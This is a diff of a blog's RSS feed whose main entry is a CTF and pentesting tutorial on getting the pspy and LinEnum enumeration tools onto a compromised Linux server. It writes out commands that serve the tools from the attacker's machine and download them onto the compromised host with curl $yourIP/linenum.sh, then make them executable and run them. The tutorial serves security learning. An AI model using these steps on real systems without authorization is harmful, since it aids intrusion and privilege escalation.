@@ -10,9 +10,9 @@
       <url>https://images.alphacoders.com/712/thumb-1920-712781.jpg</url>
     </image>
     <ttl>1440</ttl>
-    <generator>After Dark 9.1.0 (Hugo 0.59.1)</generator>
+    <generator>After Dark 9.1.0 (Hugo 0.74.2)</generator>
     <language>en-US</language>
-    <lastBuildDate>Wed, 25 Mar 2020 14:15:08 UT</lastBuildDate>
+    <lastBuildDate>Wed, 05 Aug 2020 08:17:19 UT</lastBuildDate>
     <atom:link href="https://domain.example/tags/linenum/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Upload enumeration tools to a linux server</title>
@@ -22,11 +22,11 @@
       <guid>https://domain.example/post/upload-tools/</guid>
       <description>Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings.</description>
       <category domain="https://domain.example/categories/post">Post</category>
-      <content:encoded><![CDATA[ Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.
-Here are two extensive guides about privesc for Windows and Linux:  Windows privesc guide Linux privesc guide 
+      <content:encoded><![CDATA[Privilege Escalation (privesc) When getting access to a server, either during a CTF or a pentesting assignment, you will probably have a limited access to the server itself. Probably because you accessed it through a compromised user. Your goal is to find a way to become root which would give you unlimited access to the server and the running programs. See, developers and sysadmins can make mistakes and have the programs running with the wrong settings. Leveraging these mistakes can give you the keys to root.
+Here are two extensive guides about privesc for Windows and Linux:
 You&amp;rsquo;ll notice in these guides that, to find the mistakes that will get us root, it&amp;rsquo;s all about enumerating the server permissions, the programs running, the cron jobs, etc. And we have tools to do that for us!
 I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post. The tools From my Tools list, you&amp;rsquo;ll find these two very useful enumeration tools:
-pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.  The command lines So now that we have the tools on our computer, how to get them to the compromised server?
+pspypspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.  LinEnumScripted Local Linux Enumeration &amp; Privilege Escalation Checks.  The command lines So now that we have the tools on our computer, how to get them to the compromised server?
 Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.
 python -m SimpleHTTPServer 80  With python3: python3 -m http.server 80  Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!
 So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write: curl $yourIP/linenum.sh  cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won&amp;rsquo;t have the permission to run so to make it executable, write: chmod &#43;x linenum.sh  And now to execute it, write &amp;ldquo;./linenum.sh&amp;rdquo; in the server directory where the downloaded linenum program is.
